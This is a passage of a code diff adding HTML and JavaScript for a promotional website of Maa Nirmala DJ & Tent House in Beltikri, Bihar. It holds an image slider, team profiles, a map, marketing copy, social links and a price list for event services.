+            if (track.scrollLeft >= (track.scrollWidth / 2)) {
+                track.scrollLeft = 0;
+            }
+        }
+        requestAnimationFrame(autoSlide);
+    }
+    
+    // Start the animation immediately
+    requestAnimationFrame(autoSlide);
+
+    // Stop auto-scrolling when user touches or swipes
+    track.addEventListener('touchstart', () => {
+        isAutoScrolling = false;
+        clearTimeout(resumeTimeout);
+    }, {passive: true});
+
+    // Resume auto-scrolling after 1.5 seconds of no touching
+    track.addEventListener('touchend', () => {
+        clearTimeout(resumeTimeout);
+        resumeTimeout = setTimeout(() => {
+            isAutoScrolling = true;
+        }, 1500);
+    });
+
+    // --- 2. Full Screen Lightbox Logic ---
+    function openLightbox(imageSrc) {
+        const lightbox = document.getElementById('mndLightbox');
+        const img = document.getElementById('lightboxImg');
+        
+        // Load the tapped image
+        img.src = imageSrc;
+        
+        // Show Lightbox with transition
+        lightbox.classList.add('active');
+        
+        // Pause slider in background
+        isAutoScrolling = false;
+    }
+
+    function closeLightbox() {
+        const lightbox = document.getElementById('mndLightbox');
+        lightbox.classList.remove('active');
+        
+        // Resume slider
+        isAutoScrolling = true;
+    }
+
+    // Close lightbox if user clicks the dark background outside the image
+    document.getElementById('mndLightbox').addEventListener('click', function(e) {
+        if (e.target === this) {
+            closeLightbox();
+        }
+    });
+</script>
+
+            <div class="section-label" style="margin-top: 40px;"><i class="fas fa-star"></i> BEST OF MAA NIRMALA DJ</div>
+<div class="slider-container">
+
+    <div class="slide-card">
+        <img src="https://i.postimg.cc/pXx5fqGQ/image_fac9be10.png" alt="Royal Wedding Setup">
+        <div class="slide-info">
+            <h3>Royal Wedding Pandals</h3>
+            <div style="font-size: 13px; color: #dddddd; margin-top: 5px; font-weight: normal; line-height: 1.4;">Experience the ultimate grandeur with our luxurious, imported fabric drapery and custom architectural setups designed for unforgettable Beltikri weddings.</div>
+        </div>
+    </div>
+
+    <div class="slide-card">
+        <img src="https://i.postimg.cc/g20XqtDW/IMG_20260303_121446.png" alt="Heavy DJ Setup">
+        <div class="slide-info">
+            <h3>Earth-Shattering DJ Rigs</h3>
+            <div style="font-size: 13px; color: #dddddd; margin-top: 5px; font-weight: normal; line-height: 1.4;">Dominate the dance floor with our massive dual subwoofers and crystal-clear line arrays. Pure acoustic supremacy for the ultimate high-energy Baaraat.</div>
+        </div>
+    </div>
+
+    <div class="slide-card">
+        <img src="https://i.postimg.cc/cLJgMkmJ/maxresdefault.jpg" alt="Lighting Setup">
+        <div class="slide-info">
+            <h3>Intelligent DMX Lighting</h3>
+            <div style="font-size: 13px; color: #dddddd; margin-top: 5px; font-weight: normal; line-height: 1.4;">Transform the night sky with synchronized 3D laser shows, brilliant LED wash lights, and cinematic cold spark pyro effects synced perfectly to the beat.</div>
+        </div>
+    </div>
+
+    <div class="slide-card">
+        <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" alt="Catering Setup">
+        <div class="slide-info">
+            <h3>Elite Gastronomy & Catering</h3>
+            <div style="font-size: 13px; color: #dddddd; margin-top: 5px; font-weight: normal; line-height: 1.4;">Serving culinary perfection with high-hygiene industrial cooking setups, premium bone china, and a vast menu of authentic, mouth-watering traditional flavors.</div>
+        </div>
+    </div>
+
+    <div class="slide-card">
+        <img src="https://i.postimg.cc/5yRdctZh/1771529133710.jpg" alt="Tent Structure">
+        <div class="slide-info">
+            <h3>Heavy-Duty Iron Trusses</h3>
+            <div style="font-size: 13px; color: #dddddd; margin-top: 5px; font-weight: normal; line-height: 1.4;">Unyielding structural integrity featuring waterproof, industrial-grade iron rigging to keep your VIP guests safe and incredibly comfortable in any weather.</div>
+        </div>
+    </div>
+
+    <div class="slide-card">
+        <img src="https://i.postimg.cc/hPgQLpyz/image_b73be3f2_1.png" alt="Floral Decoration">
+        <div class="slide-info">
+            <h3>Bespoke Floral Architecture</h3>
+            <div style="font-size: 13px; color: #dddddd; margin-top: 5px; font-weight: normal; line-height: 1.4;">Breathtaking Varmala stages and intricate floral archways crafted by expert designers using the absolute freshest orchids, roses, and vibrant marigolds.</div>
+        </div>
+    </div>
+
+    <div class="slide-card">
+        <img src="https://i.postimg.cc/bwFG60Cv/image_ae71021a.png" alt="Generator Setup">
+        <div class="slide-info">
+            <h3>Silent Power Infrastructure</h3>
+            <div style="font-size: 13px; color: #dddddd; margin-top: 5px; font-weight: normal; line-height: 1.4;">Uninterrupted celebrations powered by our highly reliable, heavy-duty Silent DG Sets. Absolute electrical reliability with zero flickering or darkness.</div>
+        </div>
+    </div>
+
+    <div class="slide-card">
+        <img src="https://i.postimg.cc/pdyF9r0J/image_143d2d44.png" alt="Transport Logistics">
+        <div class="slide-info">
+            <h3>Flawless Heavy Logistics</h3>
+            <div style="font-size: 13px; color: #dddddd; margin-top: 5px; font-weight: normal; line-height: 1.4;">Backed by Laxmikant  Transport, our formidable mechanical fleet guarantees the punctual, safe delivery of colossal payloads to any remote venue.</div>
+        </div>
+    </div>
+
+</div>
+
+            <div class="section-label" id="liveGallerySection" style="margin-top: 40px;"><i class="fas fa-broadcast-tower"></i> LIVE UPDATES & GALLERY</div>
+            <div class="feed-container" id="dynamicGallery">
+                </div>
+            
+            <div class="section-label" style="margin-top:40px;"><i class="fas fa-users"></i> MEET OUR TEAM</div>
+            <div class="slider-container">
+                <div class="team-card">
+                    <img src="https://i.postimg.cc/6qbJj3hQ/Screenshot-2026-01-14-15-25-06-57-1c337646f29875672b5a61192b9010f9-2.jpg" alt="Anil Kumar">
+                    <h1>Anil Kumar</h1>
+                    <h3>Owner & Founder</h3>
+                    <p>A passionate and hardworking individual providing the best event setup, DJ, and Tent services.</p>
+                </div>
+                <div class="team-card">
+                    <img src="https://i.postimg.cc/7Y7rMx2y/Screenshot-2026-01-14-15-33-01-78-965bbf4d18d205f782c6b8409c5773a4-2.jpg" alt="Mr. Sildhar Kumar">
+                    <h1>Mr. Sildhar Kumar</h1>
+                    <h3>Business Dev. Manager</h3>
+                    <p>Ensuring top-tier service delivery and managing all grand event setups across the district.</p>
+                </div>
+                <div class="team-card">
+                    <img src="https://i.postimg.cc/qMWWzWbF/Screenshot-2026-01-14-15-29-44-90-965bbf4d18d205f782c6b8409c5773a4.jpg" alt="Mr. Sanjay Kumar">
+                    <h1>Mr. Sanjay Kumar</h1>
+                    <h3>Business Dev. Manager</h3>
+                    <p>Ensuring top-tier service delivery and managing all grand event setups across the district.</p>
+                </div>
+                <div class="team-card">
+                    <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" alt="Lalu Kumar">
+                    <h1>Lalu Kumar</h1>
+                    <h3>Business Associate</h3>
+                    <p>Coordinating premium tent decorations, lighting arrangements, and dedicated client relations.</p>
+                </div>
+            </div>
+            <div class="section-label" style="margin-top:40px;"><i class="fas fa-info-circle"></i> ABOUT THE BUSINESS</div>
+<div class="owner-profile" style="text-align: left;">
+<h1 style="text-align: center; font-size: 28px;">Maa Nirmala DJ & Tent House</h1>
+<p style="text-align: center; color: var(--gold-primary); font-weight: bold; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px;">Premium Event Management in Bihar</p>
+<p style="font-size: 14px;">Welcome to <b>Maa Nirmala DJ & Tent House</b>, the premier event management and setup service based in Beltikri. We specialize in transforming ordinary events into grand, unforgettable celebrations.</p>
+<ul style="color: #eaeaea; font-size: 14px; line-height: 1.8; margin-left: 20px; margin-bottom: 25px; margin-top: 15px;">
+<li><b style="color: var(--gold-primary);">Elite DJ Setups:</b> High-fidelity sound systems, heavy bass, and non-stop entertainment.</li>
+<li><b style="color: var(--gold-primary);">Premium Tent Houses:</b> Grand wedding tents, VIP seating, and beautiful decorations.</li>
+<li><b style="color: var(--gold-primary);">Stage Lighting:</b> Advanced dynamic lighting to illuminate your special moments.</li>
+</ul>
+<div style="border-top: 1px solid var(--border-color); margin: 25px 0;"></div>
+<div style="text-align: center;">
+<img src="https://i.postimg.cc/6qbJj3hQ/Screenshot-2026-01-14-15-25-06-57-1c337646f29875672b5a61192b9010f9-2.jpg" alt="Anil Kumar" style="width: 100px; height: 100px; margin-bottom: 10px; border: 3px solid var(--gold-primary); border-radius: 50%; object-fit: cover; display: inline-block;">
+<h2 style="color: var(--gold-primary); font-family: 'Cinzel'; font-size: 22px; font-weight: bold;">Anil Kumar Tanti</h2>
+<h3 style="font-size: 12px; color: #aaa; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px;">Founder & Owner</h3>
+                </div>
+            </div>
+            <div class="section-label" style="margin-top:40px;"><i class="fas fa-map-marker-alt"></i> OUR LOCATION</div>
+            <div class="map-container">
+                <p style="text-align: center; color: var(--gold-primary); font-family: 'Cinzel'; font-weight: bold; font-size: 18px; margin-bottom: 5px;">Maa Nirmala DJ & Tent House</p>
+                <p style="text-align: center; font-size: 12px; color: #ccc; margin-bottom: 15px; font-family: 'Outfit'; letter-spacing: 1px;">JRPM+RQ, Beltikri, Tola Tetaria, Bihar 813106</p>
+                
+                <div class="map-wrapper">
+                    <iframe src="https://maps.google.com/maps?q=JRPM%2BRQ%20Beltikri,%20Bihar%20813106&t=&z=16&ie=UTF8&iwloc=&output=embed" width="100%" height="100%" frameborder="0" style="border:0;" allowfullscreen="" aria-hidden="false" tabindex="0"></iframe>
+                </div>
+                
+                <a href="https://www.google.com/maps/dir/?api=1&destination=JRPM%2BRQ,+Beltikri,+Bihar+813106" target="_blank" style="display: block; width: 100%; padding: 15px; background: var(--gold-primary); color: #000; text-align: center; font-weight: bold; border-radius: 8px; text-decoration: none; margin-top: 15px; font-family: 'Rajdhani'; letter-spacing: 1px; transition: 0.3s;">
+                    <i class="fas fa-directions"></i> GET DIRECTIONS TO MAP
+                </a>
+            </div>
+            <div class="section-label" style="margin-top:40px;"><i class="fas fa-music"></i> THE MAA NIRMALA EXPERIENCE</div>
+            <div style="background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 20px; padding: 20px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.2);">
+                <img src="https://i.postimg.cc/Vv6QHtHD/1771530083282.jpg" style="width: 100%; height: 200px; object-fit: cover; border-radius: 12px; border: 2px solid var(--gold-primary); margin-bottom: 15px;" alt="Experience">
+                <h3 style="color: var(--gold-primary); font-family: 'Cinzel'; margin-bottom: 10px; font-size: 20px;">Our Sound & Vibes</h3>
+                <p style="font-size: 14px; line-height: 1.6; color: #ddd;">Maa Nirmala DJ sets the standard for high-energy celebrations in Banka. With state-of-the-art audio, dazzling light shows, and premium VIP tents, we guarantee a flawless event. From intimate functions to massive district festivals, our team works tirelessly to bring your dream event to reality.</p>
+            </div>
+                      <div class="section-label" style="margin-top:40px;"><i class="fas fa-music"></i> THE MAA NIRMALA EXPERIENCE</div>
+            <div style="background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 20px; padding: 20px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.2);">
+                <img src="https://i.postimg.cc/hPgQLpyz/image_b73be3f2_1.png" style="width: 100%; height: 200px; object-fit: cover; border-radius: 12px; border: 2px solid var(--gold-primary); margin-bottom: 15px;" alt="Experience">
+                <h3 style="color: var(--gold-primary); font-family: 'Cinzel'; margin-bottom: 10px; font-size: 20px;">Decoration & Tent House</h3>
+                <p style="font-size: 14px; line-height: 1.6; color: #ddd;">Maa Nirmala DJ sets the standard for high-energy celebrations in Banka. With state-of-the-art audio, dazzling light shows, and premium VIP tents, we guarantee a flawless event. From intimate functions to massive district festivals, our team works tirelessly to bring your dream event to reality.</p>
+            </div>
+          <div style="width: 100%; padding: 40px 15px; background-color: transparent; display: flex; flex-direction: column; align-items: center; justify-content: center; box-sizing: border-box;">
+
+    <div class="section-label" style="margin-bottom: 30px; color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; font-size: 14px; font-weight: bold; letter-spacing: 2px; text-transform: uppercase; text-align: center;">
+        <i class="fas fa-crown"></i> The Maa Nirmala Experience
+    </div>
+
+    <div style="max-width: 800px; text-align: center;">
+
+        <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 20px; font-size: 24px; font-weight: 800; line-height: 1.4; letter-spacing: 1px;">
+            THE PINNACLE OF PREMIUM CELEBRATIONS
+        </h3>
+        
+        <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+            Maa Nirmala DJ & Tent House sets the absolute standard for high-energy, luxurious celebrations across Banka. Under the visionary leadership of Mr. Lalu Kumar Tanti, we have transformed countless events from ordinary gatherings into extraordinary cinematic experiences. Situated in the historic heart of Beltikri, Kaddhar, Katoria, our dedicated team works tirelessly to bring your ultimate dream event to reality with unmatched precision. We believe that a celebration is not merely a date on a calendar, but a profound milestone in human life that deserves the utmost reverence, spectacular visual beauty, and flawless technical execution.
+        </p>
+
+        <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 15px; font-size: 20px; font-weight: 700; letter-spacing: 1px;">
+            THE SUPREMACY OF ACOUSTIC ENGINEERING
+        </h3>
+
+        <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+            The soul of any grand event is its acoustic heartbeat. At Maa Nirmala DJ, we do not simply play music; we engineer an auditory atmosphere that captivates the senses. We deploy state-of-the-art, heavy-duty subwoofers that push massive volumes of air, ensuring an earth-shattering bass response that you can feel resonating in your very soul. Complementing this low-end power are our crystal-clear, high-frequency line-array top speakers, strategically positioned to cast sound evenly across massive venues without a single hint of distortion. Whether it is a subtle background melody during a serene wedding ritual or a high-octane electronic drop at a midnight dance party, our audio technicians balance every frequency with surgical precision.
+        </p>
+
+        <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 15px; font-size: 20px; font-weight: 700; letter-spacing: 1px;">
+            DYNAMIC VISUAL VIBES & INTELLIGENT LIGHTING
+        </h3>
+
+        <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+            Sound alone cannot carry a premium event; it must be paired with a breathtaking visual spectacle. We utilize intelligent, programmable DMX lighting systems to paint the venue in vibrant colors and dynamic movement. Our synchronized laser light shows slice through the darkness, while our powerful moving head beams track the tempo of the music, creating an immersive, concert-level club environment right at your venue. By introducing atmospheric effects such as heavy ground fog and spectacular cold spark machines during key moments—like the bride and groom's grand entrance—we elevate the emotional impact of the evening to truly cinematic heights.
+        </p>
+
+        <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 15px; font-size: 20px; font-weight: 700; letter-spacing: 1px;">
+            ROYAL TENT ARCHITECTURE & STRUCTURAL INTEGRITY
+        </h3>
+
+        <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+            Beyond the music and lights, we construct magnificent, temporary palaces. Our premium tent setups are feats of structural engineering, built using heavy-duty iron trusses and highly secure rigging systems that guarantee absolute safety and stability, regardless of unpredictable weather conditions. We construct massive waterproof pandals draped in miles of luxurious, imported fabrics that cascade elegantly from towering ceilings. The interiors are designed with immaculate spatial awareness, featuring dedicated VIP seating zones, expansive dining areas, and plush, wall-to-wall carpeting that provides a royal walking experience for every guest in attendance.
+        </p>
+
+        <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 15px; font-size: 20px; font-weight: 700; letter-spacing: 1px;">
+            BESPOKE FLORAL DECOR & STAGE CRAFTSMANSHIP
+        </h3>
+
+        <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+            The stage is the undisputed focal point of your celebration, and our decoration team crafts it into a breathtaking visual masterpiece. We seamlessly blend traditional Indian wedding aesthetics with modern, contemporary design trends. Utilizing thousands of fresh, vibrant blooms, our decorators construct intricate floral archways, majestic entry gates (Dwar), and stunning photo booths. The main stage is furnished with customized luxury couches and thematic backdrops, ensuring that every photograph taken captures the elegance, grandeur, and prestige of your special day perfectly.
+        </p>
+
+        <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 15px; font-size: 20px; font-weight: 700; letter-spacing: 1px;">
+            UNYIELDING POWER BACKUP SYSTEMS
+        </h3>
+
+        <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+            A luxury event cannot afford a single millisecond of darkness or silence. Recognizing the unpredictability of local power grids, Maa Nirmala DJ & Tent House provides absolute, unyielding power reliability. We deploy massive, heavy-duty, silent generator (DG) sets capable of sustaining the enormous electrical load required by our line-array speakers, massive lighting rigs, and catering equipment. Our dedicated technicians monitor these systems continuously throughout the event, ensuring that the magic, the music, and the celebration continue flawlessly without a single interruption.
+        </p>
+
+        <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 15px; font-size: 20px; font-weight: 700; letter-spacing: 1px;">
+            LOGISTICAL MIGHT & TRANSPORT EFFICIENCY
+        </h3>
+
+        <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+            The invisible backbone of our grand setups is an incredibly robust logistical network. Transporting towering iron trusses, heavy subwoofers, delicate lighting fixtures, and miles of fabric requires supreme efficiency. Supported powerfully by Laxmikant Tanti farming tractor services, we possess the logistical might to deliver massive payloads of equipment to any venue, no matter how remote the location in Banka district. Our setup and teardown teams, including dedicated associates like Sildhar Kumar, operate with military-like precision, ensuring that venues are prepared well in advance and cleared seamlessly once the celebration concludes.
+        </p>
+
+        <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 15px; font-size: 20px; font-weight: 700; letter-spacing: 1px;">
+            MASTERING EVERY TYPE OF CELEBRATION
+        </h3>
+
+        <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+            Our expertise is not limited to a single type of event. We are masters of versatility, capable of adapting our immense resources to perfectly suit the specific emotional tone of your gathering. For grand weddings, we provide the royal, traditional elegance required for Baraat processions, Haldi ceremonies, and luxurious receptions. For massive district-level religious festivals and melas, we construct incredibly durable, high-capacity structures. And for high-energy birthday bashes or anniversaries, we shift our focus to delivering the ultimate, neon-lit, heavy-bass dance floor experience.
+        </p>
+
+        <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 15px; font-size: 20px; font-weight: 700; letter-spacing: 1px;">
+            SAFETY PROTOCOLS & ON-SITE MANAGEMENT
+        </h3>
+
+        <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+            True luxury includes the luxury of peace of mind. We take the safety of your guests with the utmost seriousness. Every electrical cable is heavily insulated and safely routed away from foot traffic to prevent trip hazards. Every heavy iron pillar is firmly anchored to the ground to withstand sudden high winds. Throughout the entirety of your event, our on-site management team remains hyper-vigilant, continuously monitoring the structural integrity of the pandals, the safe operation of the generators, and the flawless output of the audio-visual equipment.
+        </p>
+
+        <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 15px; font-size: 20px; font-weight: 700; letter-spacing: 1px;">
+            A LEGACY BUILT ON TRUST AND PERFECTION
+        </h3>
+
+        <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 20px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+            For years, the communities of Beltikri, Katoria, and the greater Banka region have trusted us with their most precious moments. This legacy of trust has been meticulously built by Mr. Lalu Kumar Tanti upon a foundation of total transparency, unwavering punctuality, and an absolute refusal to compromise on quality. When you hire Maa Nirmala DJ & Tent House, you are not just renting equipment; you are partnering with an entire organization dedicated solely to your joy. We leave nothing to chance, we accept no excuses, and we let our spectacular results speak for themselves. Choose us, and let us engineer the perfect, unforgettable night.
+        </p>
+    </div>
+    <div style="text-align: center;">
+                    <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 20px; font-size: 24px; font-weight: 800; line-height: 1.4; letter-spacing: 1px;">
+                        THE PINNACLE OF PREMIUM CELEBRATIONS
+                    </h3>
+                    <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+                        Maa Nirmala DJ & Tent House sets the absolute standard for high-energy, luxurious celebrations across Banka. Under the visionary leadership of Mr. Lalu Kumar Tanti, we have transformed countless events from ordinary gatherings into extraordinary cinematic experiences. Situated in the historic heart of Beltikri, Kaddhar, Katoria, our dedicated team works tirelessly to bring your ultimate dream event to reality with unmatched precision.
+                    </p>
+
+                    <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 15px; font-size: 20px; font-weight: 700; letter-spacing: 1px;">
+                        THE SUPREMACY OF ACOUSTIC ENGINEERING
+                    </h3>
+                    <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+                        The soul of any grand event is its acoustic heartbeat. At Maa Nirmala DJ, we engineer an auditory atmosphere that captivates the senses. We deploy state-of-the-art, heavy-duty subwoofers that push massive volumes of air, ensuring an earth-shattering bass response. Complementing this low-end power are our crystal-clear, high-frequency line-array top speakers.
+                    </p>
+
+                    <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 15px; font-size: 20px; font-weight: 700; letter-spacing: 1px;">
+                        DYNAMIC VISUAL VIBES & INTELLIGENT LIGHTING
+                    </h3>
+                    <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+                        Sound alone cannot carry a premium event. We utilize intelligent, programmable DMX lighting systems to paint the venue in vibrant colors. Our synchronized laser light shows slice through the darkness, while powerful moving head beams track the tempo of the music, creating an immersive club environment right at your venue.
+                    </p>
+
+                    <h3 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; margin-bottom: 15px; font-size: 20px; font-weight: 700; letter-spacing: 1px;">
+                        ROYAL TENT ARCHITECTURE
+                    </h3>
+                    <p style="font-size: 15px; line-height: 1.7; color: #cccccc; margin-bottom: 35px; font-family: 'Outfit', sans-serif; font-weight: 400; text-wrap: balance;">
+                        Beyond the music, we construct magnificent temporary palaces. Our premium tent setups are feats of structural engineering, built using heavy-duty iron trusses and secure rigging systems. We construct massive waterproof pandals draped in miles of luxurious imported fabrics.
+                    </p>
+                </div>
+            </div>
+<div style="text-align: center; max-width: 800px; margin: 40px auto 20px auto; padding: 0 20px;">
+    <p style="color: #dddddd; font-family: 'Outfit', sans-serif; font-size: 16px; line-height: 1.8; text-wrap: balance; margin-bottom: 30px;">
+        Maa Nirmala DJ sets the standard for high-energy celebrations in Banka. With state-of-the-art audio, dazzling light shows, and premium VIP tents, we guarantee a flawless event. From intimate functions to massive district festivals, our team works tirelessly to bring your dream event to reality.
+    </p>
+
+    <h4 style="color: var(--gold-primary, #D4AF37); font-family: 'Cinzel', serif; font-size: 18px; margin-bottom: 20px; letter-spacing: 1px; text-transform: uppercase;">
+        <i class="fas fa-link"></i> Follow & Connect
+    </h4>
+
+    <style>
+        .mn-social-icon {
+            color: #ffffff;
+            font-size: 26px;
+            text-decoration: none;
+            transition: transform 0.3s ease, color 0.3s ease;
+        }
+        .mn-social-icon:hover {
+            color: var(--gold-primary, #D4AF37);
+            transform: scale(1.2);
+        }
+    </style>
+    
+    <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; max-width: 600px; margin: 0 auto;">
+        <a href="https://www.instagram.com/maa_nirmala_dj" target="_blank" class="mn-social-icon" title="Instagram"><i class="fab fa-instagram"></i></a>
+        <a href="https://www.facebook.com/MaaNirmalaDJ7" target="_blank" class="mn-social-icon" title="Facebook"><i class="fab fa-facebook-f"></i></a>
+        <a href="https://x.com/maa_nirmala_dj" target="_blank" class="mn-social-icon" title="X"><i class="fab fa-x-twitter"></i></a>
+        <a href="https://maanirmaladj.github.io/Maa-Nirmala-DJ-Beltikri/" target="_blank" class="mn-social-icon" title="Website"><i class="fas fa-globe"></i></a>
+        <a href="https://www.linkedin.com/in/maa-nirmala-dj-tent-house-3499a33b0" target="_blank" class="mn-social-icon" title="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
+        <a href="https://www.threads.com/@maa_nirmala_dj" target="_blank" class="mn-social-icon" title="Threads"><i class="fab fa-threads"></i></a>
+        <a href="https://www.youtube.com/channel/UCQPUgEyCm8nihqhYGMUX6Pw" target="_blank" class="mn-social-icon" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://whatsapp.com/channel/0029Vb7AMDl4IBhJ34po3L1k" target="_blank" class="mn-social-icon" title="WhatsApp Channel"><i class="fab fa-whatsapp"></i></a>
+        <a href="https://t.me/MaaNirmalaDJ" target="_blank" class="mn-social-icon" title="Telegram"><i class="fab fa-telegram-plane"></i></a>
+        <a href="https://maps.app.goo.gl/fSqCowWHPoVxGuLz6" target="_blank" class="mn-social-icon" title="Location"><i class="fas fa-map-marker-alt"></i></a>
+    </div>
+</div>
+
+<div style="text-align:center; margin-top:40px; margin-bottom:30px;">
+    <div class="rights" style="color:var(--gold-primary); font-weight:bold; font-size:12px;">      © 2026 All Rights Reserved —Maa Nirmala DJ & Tent House</div>
+</div>
+        <div class="bottom-nav">
+            <div class="nav-item active" id="navHome" onclick="navAction('home')"><i class="fas fa-home"></i><span>Home</span></div>
+            <div class="nav-item" id="navLinks" onclick="navAction('links')"><i class="fas fa-link"></i><span>Links</span></div>
+            <div class="nav-item" id="navBooking" onclick="navAction('booking')"><i class="fas fa-calendar-alt"></i><span>Booking</span></div>
+            <div class="nav-item" id="navLogin" onclick="navAction('login')"><i class="fas fa-user-shield"></i><span>Auth</span></div>
+        </div>
+
+        <div class="ai-trigger" onclick="openAI()"><i class="fas fa-brain" style="font-size:24px; color:#fff;"></i></div>
+
+        <div class="modal-wrap" id="priceModal" onclick="closeModal(event)">
+            <div class="modal-inner" onclick="event.stopPropagation()">
+                <div class="ai-head" style="padding:15px; border-bottom:1px solid #333; display:flex; justify-content:space-between; align-items:center;">
+                    <span style="color:var(--gold-primary); font-weight:bold; font-family:'Cinzel';"><i class="fas fa-tags"></i> STANDARD PRICE LIST</span>
+                    <i class="fas fa-times" onclick="closeModal(null, true)" style="color:#fff; cursor:pointer;"></i>
+                </div>
+                <div class="book-area">
+                    <p style="color:#ddd; font-size:12px; margin-bottom:20px; text-align:center;">*Prices are estimated starting points and may vary based on location and specific event requirements.</p>
+                    
+                   <div class="price-card">
+                        <div>
+                            <div class="price-title">Heavy DJ Setup</div>
+                            <div style="font-size:11px; color:#aaa;">Dual Bass, Tops, Light & Operator</div>
+                        </div>
+                        <div class="price-amt">₹8,000+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Grand Wedding Tent</div>
+                            <div style="font-size:11px; color:#aaa;">Pandal, Chairs, VIP Sofa, Carpet</div>
+                        </div>
+                        <div class="price-amt">₹25,000+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Stage Decoration</div>
+                            <div style="font-size:11px; color:#aaa;">Floral Setup, Lighting, Backdrop</div>
+                        </div>
+                        <div class="price-amt">₹10,000+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Complete Package</div>
+                            <div style="font-size:11px; color:#aaa;">DJ + Tent + Lighting Full Setup</div>
+                        </div>
+                        <div class="price-amt">Custom</div>
+                    </div>
+
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Standard Sound System</div>
+                            <div style="font-size:11px; color:#aaa;">2 Bass, 2 Tops, Mixer & Mics</div>
+                        </div>
+                        <div class="price-amt">₹5,000+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Mega Concert DJ Rig</div>
+                            <div style="font-size:11px; color:#aaa;">4 Heavy Bass, Line Array Tops, DMX Lights</div>
+                        </div>
+                        <div class="price-amt">₹15,000+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Baaraat DJ Trolley</div>
+                            <div style="font-size:11px; color:#aaa;">Moving Sound Setup with Lights & Power</div>
+                        </div>
+                        <div class="price-amt">₹12,000+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Haldi / Mehendi Sound</div>
+                            <div style="font-size:11px; color:#aaa;">Compact Crystal Clear Audio Setup</div>
+                        </div>
+                        <div class="price-amt">₹3,500+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Intelligent Laser Show</div>
+                            <div style="font-size:11px; color:#aaa;">3D Lasers, Moving Heads, Synchronized</div>
+                        </div>
+                        <div class="price-amt">₹6,000+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Cinematic Visual Effects</div>
+                            <div style="font-size:11px; color:#aaa;">Heavy Fog Machine & Safe Cold Spark Pyro</div>
+                        </div>
+                        <div class="price-amt">₹4,500+</div>
+                    </div>
+                    <div class="price-card">
+                        <div>
+                            <div class="price-title">Ambient Venue Lighting</div>
+                            <div style="font-size:11px; color:#aaa;">LED Wash Lights, Fairy Lights for Tent</div>
+                        </div>
+                        <div class="price-amt">₹5,500+</div>
